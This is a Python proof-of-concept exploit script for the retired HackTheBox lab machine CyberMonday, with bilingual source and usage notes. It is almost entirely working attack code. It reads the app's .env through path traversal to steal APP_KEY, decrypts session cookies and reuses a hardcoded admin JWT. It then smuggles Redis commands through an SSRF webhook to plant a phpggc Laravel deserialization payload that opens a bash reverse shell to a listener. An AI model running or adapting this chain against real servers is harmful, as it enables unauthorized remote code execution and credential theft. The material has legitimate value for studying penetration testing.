#!/usr/bin/env python3
# Fuente / Source: https://github.com/saoGITo/HTB_Cybermonday (HTB_Cybermonday_poc.py)
# Fecha de acceso / Accessed: 2026-09-25. Autor notas: Apuromafo (curaduria local).
# Maquina / Machine: HTB CyberMonday (Hard, retired) - off-by-slash (.env/APP_KEY) + mass assignment + SSRF a redis + deserializacion Laravel (phpggc RCE10).
# NOTA: el JWT de test hardcodeado es artefacto del laboratorio retirado (parte del exploit), no credencial personal.
# Uso / Usage: python3 HTB_Cybermonday_poc.py <listener ip> <listener port>
#   1. echo "10.10.11.228 cybermonday.htb" >> /etc/hosts
#   2. echo "10.10.11.228 webhooks-api-beta.cybermonday.htb" >> /etc/hosts
#   3. apt install phpggc
#   4. nc -nvlp 4444
#   5. python3 HTB_Cybermonday_poc.py 10.10.14.1 4444
import os
import json
import hashlib
import sys
import hmac
import base64
import string
import random
import requests
import subprocess
from Crypto.Cipher import AES
from phpserialize import loads, dumps

if len(sys.argv) < 2:
    print("Usage: python3 HTB_Cybermonday_poc.py <listener ip> <listener port>")
    sys.exit(1)

username = random.randint(100, 100000)
password = random.randint(100, 100000)


def mcrypt_decrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.decrypt(value)


def decrypt(bstring):
    global key
    dic = json.loads(base64.b64decode(bstring).decode())
    mac = dic['mac']
    value = bytes(dic['value'], 'utf-8')
    iv = bytes(dic['iv'], 'utf-8')
    if mac == hmac.new(key, iv+value, hashlib.sha256).hexdigest():
        return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))
    return ''


# create session
sess = requests.Session()

# login
sess.post('http://cybermonday.htb/login', data={"email": f"{username}%40cybermonday.htb", "password":password})

# Define the target URL
url = "http://cybermonday.htb/assets../.env"

# Send a GET request to the URL
response = requests.get(url)

# Check if the request was successful (status code 200)
if response.status_code == 200:
    # Split the response text into lines
    lines = response.text.split('\n')

    # Find and extract the value of APP_KEY
    app_key = None
    for line in lines:
        if line.startswith("APP_KEY="):
            app_key = line.split(":")[1]
            break

    if app_key:
        app_key1 = app_key
    else:
        print("APP_KEY not found in the response.")
else:
    print(f"Failed to retrieve .env file. Status code: {response.status_code}")

# get session value
key     = base64.b64decode(app_key1)
session = str(decrypt(str(sess.cookies['cybermonday_session'].replace('%3D', '=')))).split('|')[1].split('\\')[0]

# define some needed vars
# phpggc -A Laravel/RCE10 system "bash -c 'bash -i >& /dev/tcp/10.10.14.17/9999 0>&1'"
# Define the command to run
command = f"phpggc -A Laravel/RCE10 system \"bash -c 'bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1'\""

# Run the command and capture the output
result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# Check for any errors
if result.returncode == 0:
    # Command was successful
    command_output = result.stdout

    payload = command_output.replace('\n', '')
else:
    # Command had an error
    print("Command failed with error:")
    print(result.stderr)


token="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.hsjDWoGJbgx_ygJe9nlfu4dNZHUZuF3Igy43NfKQ7aE"

headers = {
    "Content-Type": "application/json",
    "x-access-token": token
}

# create webhook
data = {
    "name": "test" + str(''.join(random.choices(string.digits, k=5))),
    "description": "test",
    "action": "sendRequest"
}
req = json.loads(requests.post('http://webhooks-api-beta.cybermonday.htb/webhooks/create', headers=headers, data=json.dumps(data)).text)
uuid = req['webhook_uuid']

data = {
    "url": "http://redis:6379/",
    "method": "SET laravel_session:" + session + " '" + payload + "'\r\n"
}


# send payload
req = requests.post('http://webhooks-api-beta.cybermonday.htb/webhooks/' + str(uuid), headers=headers, data=json.dumps(data))

print("[+] Get reverse shell")


# load session and exploit
exp=sess.get('http://cybermonday.htb/home')
